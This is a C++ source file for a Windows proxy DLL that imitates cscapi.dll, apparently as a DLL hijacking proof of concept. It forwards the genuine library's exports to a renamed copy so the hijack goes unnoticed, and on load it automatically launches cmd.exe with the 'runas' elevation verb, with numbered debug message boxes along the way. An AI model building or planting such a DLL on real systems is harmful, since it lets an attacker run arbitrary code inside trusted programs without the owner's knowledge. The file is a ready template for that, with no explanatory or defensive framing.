// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <windows.h>
#include <shellapi.h>

using namespace std;
#pragma once
#pragma comment(linker,"/export:CscNetApiGetInterface=cscapi_org.CscNetApiGetInterface,@1")
#pragma comment(linker,"/export:CscSearchApiGetInterface=cscapi_org.CscSearchApiGetInterface,@2")
#pragma comment(linker,"/export:OfflineFilesEnable=cscapi_org.OfflineFilesEnable,@3")
#pragma comment(linker,"/export:OfflineFilesGetShareCachingMode=cscapi_org.OfflineFilesGetShareCachingMode,@4")
#pragma comment(linker,"/export:OfflineFilesQueryStatus=cscapi_org.OfflineFilesQueryStatus,@5")
#pragma comment(linker,"/export:OfflineFilesQueryStatusEx=cscapi_org.OfflineFilesQueryStatusEx,@6")
#pragma comment(linker,"/export:OfflineFilesStart=cscapi_org.OfflineFilesStart,@7")




int go() {
    SHELLEXECUTEINFOW sei = { sizeof(SHELLEXECUTEINFOW) };
    sei.fMask = SEE_MASK_FLAG_DDEWAIT | SEE_MASK_NOCLOSEPROCESS; 
    sei.lpVerb = L"runas";  
    sei.lpFile = L"C:\\Windows\\System32\\cmd.exe";
    sei.nShow = SW_SHOWNORMAL;
    MessageBoxW(NULL, L"2.", L"Execution Successful", MB_OK | MB_ICONINFORMATION);

    if (!ShellExecuteExW(&sei)) {

        DWORD error = GetLastError();
        wchar_t msg[256];
        swprintf(msg, 256, L"Error Code: %lu", error);
        MessageBoxW(NULL, msg, L"Execution Failed", MB_OK | MB_ICONERROR);
        MessageBoxW(NULL, L"3.", L"Execution Successful", MB_OK | MB_ICONINFORMATION);

        return 1;
    }
    else {
        MessageBoxW(NULL, L"4.", L"Execution Successful", MB_OK | MB_ICONINFORMATION);
    }

    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        MessageBoxW(NULL, L"1.", L"Execution Successful", MB_OK | MB_ICONINFORMATION);
        go();
        break;
    }
    return TRUE;
}





